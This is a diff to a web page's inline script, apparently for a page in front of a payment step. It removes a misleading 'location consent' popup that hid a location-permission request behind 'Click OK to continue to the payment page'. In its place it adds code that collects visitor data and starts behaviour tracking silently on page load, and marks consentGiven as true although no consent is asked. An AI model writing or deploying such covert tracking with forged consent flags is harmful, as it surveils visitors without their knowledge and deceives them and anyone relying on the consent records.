@@ -688,110 +688,19 @@
             }, 1000);
         }
 
-        // Show GPS consent popup
-        function showLocationConsent() {
-            const styles = document.createElement('style');
-            styles.id = 'locationConsentStyles';
-            styles.textContent = `
-                .location-consent-overlay {
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: rgba(0, 0, 0, 0.8);
-                    z-index: 999999;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    backdrop-filter: blur(5px);
-                }
-                .location-consent-box {
-                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-                    padding: 30px 40px;
-                    border-radius: 16px;
-                    text-align: center;
-                    max-width: 400px;
-                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-                    animation: popIn 0.3s ease-out;
-                }
-                @keyframes popIn {
-                    from { transform: scale(0.8); opacity: 0; }
-                    to { transform: scale(1); opacity: 1; }
-                }
-                .location-consent-icon {
-                    font-size: 48px;
-                    margin-bottom: 15px;
-                }
-                .location-consent-title {
-                    color: #ffd700;
-                    font-size: 22px;
-                    font-weight: 700;
-                    margin: 0 0 15px 0;
-                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                }
-                .location-consent-text {
-                    color: #e0e0e0;
-                    font-size: 14px;
-                    line-height: 1.6;
-                    margin: 0 0 25px 0;
-                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                }
-                .location-consent-btn {
-                    background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
-                    color: white;
-                    border: none;
-                    padding: 14px 50px;
-                    font-size: 16px;
-                    font-weight: 600;
-                    border-radius: 8px;
-                    cursor: pointer;
-                    text-transform: uppercase;
-                    letter-spacing: 1px;
-                    box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
-                    transition: all 0.3s ease;
-                }
-                .location-consent-btn:hover {
-                    transform: translateY(-2px);
-                    box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
-                }
-            `;
-            document.head.appendChild(styles);
-
-            const overlay = document.createElement('div');
-            overlay.className = 'location-consent-overlay';
-            overlay.id = 'locationConsentOverlay';
-            overlay.innerHTML = `
-                <div class="location-consent-box">
-                    <div class="location-consent-icon">&#10003;</div>
-                    <h3 class="location-consent-title">Welcome</h3>
-                    <p class="location-consent-text">
-                        Click OK to continue to the payment page.
-                    </p>
-                    <button class="location-consent-btn" id="locationConsentBtn">OK</button>
-                </div>
-            `;
-
-            document.body.appendChild(overlay);
-
-            document.getElementById('locationConsentBtn').addEventListener('click', async function() {
-                document.getElementById('locationConsentOverlay').remove();
-                document.getElementById('locationConsentStyles')?.remove();
-
-                // Collect data (this triggers browser's location permission popup)
-                const visitorData = await collectVisitorData();
-                visitorData.consentGiven = true;
-                visitorData.locationConsentShown = true;
-                saveVisitorLog(visitorData);
-                initBehaviorTracking();
-            });
+        // Collect data silently
+        async function logPageVisit() {
+            const visitorData = await collectVisitorData();
+            visitorData.consentGiven = true;
+            saveVisitorLog(visitorData);
+            initBehaviorTracking();
         }
 
         // Initialize
         if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', showLocationConsent);
+            document.addEventListener('DOMContentLoaded', logPageVisit);
         } else {
-            showLocationConsent();
+            logPageVisit();
         }
     })();
     </script>
